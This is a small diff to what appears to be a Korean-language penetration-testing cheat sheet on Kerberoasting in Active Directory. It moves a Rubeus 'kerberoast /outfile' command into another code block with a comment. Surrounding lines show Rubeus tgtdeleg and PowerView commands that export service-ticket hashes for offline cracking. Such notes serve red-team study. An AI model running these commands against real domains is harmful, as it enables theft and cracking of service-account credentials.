@@ -473,6 +473,9 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 ```powershell
 # 현재 사용자의 티켓을 base64로 출력.
 .\rubeus.exe tgtdeleg /nowrap
+
+# 현재 사용자의 계정으로 커버로스팅 공격 시도.
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
 ```powershell
@@ -484,8 +487,6 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 
 # 특정 사용자 타겟팅 (TGT 위임 사용)
 .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
-
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
   
 </details>
